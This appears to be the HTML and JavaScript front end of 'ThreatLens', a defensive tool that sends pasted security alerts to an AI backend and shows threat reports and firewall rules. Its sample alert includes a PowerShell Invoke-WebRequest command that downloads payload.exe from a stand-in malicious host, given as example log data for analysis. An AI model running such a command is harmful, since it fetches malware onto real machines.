<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ThreatLens - Threat Intelligence Analyzer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #0a0e14 0%, #1a1f2e 100%);
            color: #e6edf3;
            padding: 2rem;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        h1 {
            font-size: 2.5rem;
            background: linear-gradient(135deg, #00d9ff, #0066ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: #8b949e;
            font-size: 1.1rem;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 1.5rem;
        }

        .status-banner {
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .status-success {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid #22c55e;
            color: #22c55e;
        }

        .status-warning {
            background: rgba(251, 191, 36, 0.1);
            border: 1px solid #f59e0b;
            color: #f59e0b;
        }

        .status-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            color: #ef4444;
        }

        textarea {
            width: 100%;
            min-height: 200px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 1rem;
            color: #e6edf3;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            resize: vertical;
        }

        textarea:focus {
            outline: none;
            border-color: #00d9ff;
        }

        .button-group {
            display: flex;
            gap: 1rem;
            margin-top: 1rem;
            flex-wrap: wrap;
        }

        button {
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00d9ff, #0066ff);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 217, 255, 0.3);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: #e6edf3;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .progress {
            margin: 1.5rem 0;
        }

        .progress-step {
            padding: 0.75rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 6px;
            margin-bottom: 0.5rem;
            border-left: 3px solid transparent;
        }

        .progress-step.active {
            border-left-color: #00d9ff;
            background: rgba(0, 217, 255, 0.1);
        }

        .progress-step.complete {
            border-left-color: #22c55e;
            opacity: 0.6;
        }

        .results {
            margin-top: 2rem;
        }

        .result-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1rem;
        }

        .result-title {
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #00d9ff;
        }

        .threat-badge {
            display: inline-block;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            font-weight: 600;
            margin-bottom: 1rem;
        }

        .threat-critical { background: #dc2626; color: white; }
        .threat-high { background: #ef4444; color: white; }
        .threat-medium { background: #f59e0b; color: white; }
        .threat-low { background: #22c55e; color: white; }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .info-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 1rem;
            border-radius: 6px;
        }

        .info-label {
            color: #8b949e;
            font-size: 0.85rem;
            margin-bottom: 0.25rem;
        }

        .info-value {
            font-size: 1.2rem;
            font-weight: 600;
        }

        pre {
            background: rgba(0, 0, 0, 0.3);
            padding: 1rem;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 0.85rem;
        }

        .hidden {
            display: none;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üõ°Ô∏è ThreatLens</h1>
            <p class="subtitle">AI-Powered Threat Intelligence Analysis</p>
        </div>

        <!-- Status Banner -->
        <div id="statusBanner" class="status-banner status-warning">
            <span class="spinner"></span>
            <span>Checking backend connection...</span>
        </div>

        <!-- Input Card -->
        <div class="card">
            <h2 style="margin-bottom: 1rem;">Paste Security Alert</h2>
            <textarea 
                id="alertInput" 
                placeholder="Paste your security alert, firewall log, or threat notification here...

Example:
Jan 29 14:23:45 firewall blocked connection from 10.0.0.15 to 185.220.101.50:443
Process: powershell.exe
Command: Invoke-WebRequest http://malicious-site.com/payload.exe
File hash: 44d88612fea8a8f36de82e1278abb02f
CVE-2024-1234 exploitation detected"
            ></textarea>
            
            <div class="button-group">
                <button id="analyzeBtn" class="btn-primary" disabled>
                    Analyze Threat
                </button>
                <button id="sampleBtn" class="btn-secondary">
                    Load Sample Alert
                </button>
                <button id="clearBtn" class="btn-secondary">
                    Clear
                </button>
            </div>
        </div>

        <!-- Progress -->
        <div id="progressContainer" class="card hidden">
            <h2 style="margin-bottom: 1rem;">Analysis Progress</h2>
            <div class="progress" id="progressSteps"></div>
        </div>

        <!-- Results -->
        <div id="resultsContainer" class="hidden"></div>
    </div>

    <script>
        const API_URL = 'http://localhost:5000';
        
        const sampleAlert = `Jan 29 14:23:45 firewall blocked connection from 10.0.0.15 to 185.220.101.50:443
User: john.doe
Process: powershell.exe
Command: Invoke-WebRequest http://malicious-site.com/payload.exe -OutFile C:\\temp\\payload.exe
File hash: 44d88612fea8a8f36de82e1278abb02f
Destination: malware-distribution.badsite.com
CVE-2024-1234 vulnerability exploitation attempt detected`;

        const steps = [
            'Extracting IOCs...',
            'Parsing alert context...',
            'Querying threat intelligence...',
            'Analyzing with AI...',
            'Generating report...'
        ];

        let backendConnected = false;
        let analyzing = false;

        // Check backend status
        async function checkBackend() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                
                const response = await fetch(`${API_URL}/api/health`, {
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (response.ok) {
                    const data = await response.json();
                    backendConnected = true;
                    
                    const geminiConfigured = data.services?.gemini_ai?.configured;
                    
                    if (geminiConfigured) {
                        showStatus('success', '‚úì Backend connected ‚Ä¢ Gemini AI ready');
                        document.getElementById('analyzeBtn').disabled = false;
                    } else {
                        showStatus('warning', '‚ö† Backend connected but Gemini AI not configured. Add API key to backend/.env');
                    }
                } else {
                    throw new Error('Backend returned error');
                }
            } catch (error) {
                backendConnected = false;
                showStatus('error', `‚úó Backend not connected. Start with: cd backend && python3 app.py`);
                document.getElementById('analyzeBtn').disabled = true;
            }
        }

        function showStatus(type, message) {
            const banner = document.getElementById('statusBanner');
            banner.className = `status-banner status-${type}`;
            banner.innerHTML = message;
        }

        // Analyze alert
        async function analyzeAlert() {
            const alertText = document.getElementById('alertInput').value.trim();
            
            if (!alertText) {
                alert('Please enter an alert to analyze');
                return;
            }

            if (!backendConnected) {
                alert('Backend is not connected. Please start the backend server.');
                return;
            }

            analyzing = true;
            document.getElementById('analyzeBtn').disabled = true;
            document.getElementById('analyzeBtn').innerHTML = '<span class="spinner"></span> Analyzing...';
            
            // Show progress
            const progressContainer = document.getElementById('progressContainer');
            const progressSteps = document.getElementById('progressSteps');
            progressContainer.classList.remove('hidden');
            progressSteps.innerHTML = '';
            
            steps.forEach((step, index) => {
                const div = document.createElement('div');
                div.className = 'progress-step';
                div.id = `step-${index}`;
                div.textContent = step;
                progressSteps.appendChild(div);
            });

            // Simulate progress
            let currentStep = 0;
            const progressInterval = setInterval(() => {
                if (currentStep > 0) {
                    document.getElementById(`step-${currentStep-1}`).classList.remove('active');
                    document.getElementById(`step-${currentStep-1}`).classList.add('complete');
                }
                if (currentStep < steps.length) {
                    document.getElementById(`step-${currentStep}`).classList.add('active');
                    currentStep++;
                }
            }, 2000);

            try {
                const response = await fetch(`${API_URL}/api/analyze`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ alert_text: alertText })
                });

                clearInterval(progressInterval);

                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(errorData.message || 'Analysis failed');
                }

                const data = await response.json();
                displayResults(data.report);
                
                // Mark all steps complete
                steps.forEach((_, index) => {
                    const stepEl = document.getElementById(`step-${index}`);
                    stepEl.classList.remove('active');
                    stepEl.classList.add('complete');
                });

            } catch (error) {
                clearInterval(progressInterval);
                alert(`Analysis failed: ${error.message}`);
                progressContainer.classList.add('hidden');
            } finally {
                analyzing = false;
                document.getElementById('analyzeBtn').disabled = false;
                document.getElementById('analyzeBtn').textContent = 'Analyze Threat';
            }
        }

        function displayResults(report) {
            const container = document.getElementById('resultsContainer');
            container.classList.remove('hidden');
            
            const threatLevel = report.summary.threat_level.toLowerCase();
            
            container.innerHTML = `
                <div class="card">
                    <h2 style="margin-bottom: 1.5rem;">Analysis Results</h2>
                    
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">Threat Level</div>
                            <div class="info-value">
                                <span class="threat-badge threat-${threatLevel}">
                                    ${report.summary.threat_level}
                                </span>
                            </div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Risk Score</div>
                            <div class="info-value" style="color: ${
                                report.summary.risk_score >= 80 ? '#dc2626' :
                                report.summary.risk_score >= 60 ? '#ef4444' :
                                report.summary.risk_score >= 40 ? '#f59e0b' : '#22c55e'
                            }">${report.summary.risk_score}/100</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Threat Type</div>
                            <div class="info-value" style="font-size: 1rem;">${report.summary.threat_classification}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Confidence</div>
                            <div class="info-value">${Math.round(report.summary.confidence * 100)}%</div>
                        </div>
                    </div>

                    <div style="margin-top: 2rem;">
                        <h3 style="margin-bottom: 1rem; color: #00d9ff;">Executive Summary</h3>
                        <p style="line-height: 1.8; color: #8b949e;">${report.summary.executive_summary}</p>
                    </div>

                    ${report.indicators.ips.length > 0 ? `
                        <div style="margin-top: 2rem;">
                            <h3 style="margin-bottom: 1rem; color: #00d9ff;">Malicious IPs (${report.indicators.ips.length})</h3>
                            ${report.indicators.ips.map(ip => `
                                <div style="padding: 0.75rem; background: rgba(255,255,255,0.05); border-left: 3px solid ${
                                    ip.threat_level === 'CRITICAL' ? '#dc2626' :
                                    ip.threat_level === 'HIGH' ? '#ef4444' :
                                    ip.threat_level === 'MEDIUM' ? '#f59e0b' : '#22c55e'
                                }; border-radius: 6px; margin-bottom: 0.5rem;">
                                    <strong>${ip.value}</strong> - ${ip.threat_level}
                                    <br><small style="color: #8b949e;">Malicious: ${ip.malicious_detections} | Abuse Score: ${ip.abuse_confidence}%</small>
                                </div>
                            `).join('')}
                        </div>
                    ` : ''}

                    <div style="margin-top: 2rem;">
                        <h3 style="margin-bottom: 1rem; color: #00d9ff;">Immediate Actions</h3>
                        <ol style="padding-left: 1.5rem; color: #8b949e; line-height: 2;">
                            ${report.recommendations.immediate_actions.map(action => `<li>${action}</li>`).join('')}
                        </ol>
                    </div>

                    ${report.firewall_rules?.iptables ? `
                        <div style="margin-top: 2rem;">
                            <h3 style="margin-bottom: 1rem; color: #00d9ff;">Firewall Rules (iptables)</h3>
                            <pre>${report.firewall_rules.iptables.join('\n')}</pre>
                        </div>
                    ` : ''}
                </div>
            `;
        }

        // Event listeners
        document.getElementById('analyzeBtn').addEventListener('click', analyzeAlert);
        document.getElementById('sampleBtn').addEventListener('click', () => {
            document.getElementById('alertInput').value = sampleAlert;
        });
        document.getElementById('clearBtn').addEventListener('click', () => {
            document.getElementById('alertInput').value = '';
            document.getElementById('resultsContainer').classList.add('hidden');
            document.getElementById('progressContainer').classList.add('hidden');
        });

        // Check backend on load
        checkBackend();
    </script>
</body>
</html>
